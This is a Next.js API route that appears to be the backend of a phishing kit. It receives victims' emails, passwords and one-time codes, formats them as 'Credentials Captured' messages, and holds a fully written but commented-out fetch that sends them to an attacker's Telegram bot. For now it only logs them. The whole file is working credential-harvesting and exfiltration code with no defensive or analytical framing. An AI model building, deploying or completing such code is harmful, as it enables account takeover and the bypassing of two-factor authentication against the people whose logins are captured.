import { type NextRequest, NextResponse } from 'next/server'

// In a real application, you would store this in environment variables
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'your_bot_token_here'
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || 'your_chat_id_here'

interface LoginData {
  type: 'login' | 'otp'
  email: string
  password?: string
  otpCode?: string
  timestamp: string
}

export async function POST(request: NextRequest) {
  try {
    const data: LoginData = await request.json()

    // Format message for Telegram based on type
    let message = ''

    if (data.type === 'login') {
      message = `
🔐 *New Login Attempt*

📧 *Email:* ${data.email}
🔑 *Password:* ${data.password}
⏰ *Timestamp:* ${data.timestamp}

*Status:* Login Credentials Captured
      `.trim()
    } else if (data.type === 'otp') {
      message = `
🔢 *OTP Code Received*

📧 *Email:* ${data.email}
💫 *OTP Code:* ${data.otpCode}
⏰ *Timestamp:* ${data.timestamp}

*Status:* Verification Code Captured
      `.trim()
    }

    // Send to Telegram Bot (uncomment when you have actual bot token)
    /*
    const telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      })
    })

    if (!telegramResponse.ok) {
      throw new Error('Failed to send message to Telegram')
    }
    */

    // For demo purposes, just log the message
    console.log('Telegram Bot Message:', message)

    // Generate a random OTP for demo (only for login type)
    let otp = null
    if (data.type === 'login') {
      otp = Math.floor(100000 + Math.random() * 900000).toString()
      console.log('Generated OTP:', otp)
    }

    return NextResponse.json({
      success: true,
      message: `${data.type === 'login' ? 'Login' : 'OTP'} submitted successfully`,
      otp: otp // In production, don't return OTP in response
    })

  } catch (error) {
    console.error('Error processing request:', error)
    return NextResponse.json(
      { success: false, message: 'Failed to process request' },
      { status: 500 }
    )
  }
}

export async function GET() {
  return NextResponse.json({
    message: 'Telegram bot integration endpoint',
    status: 'active'
  })
}
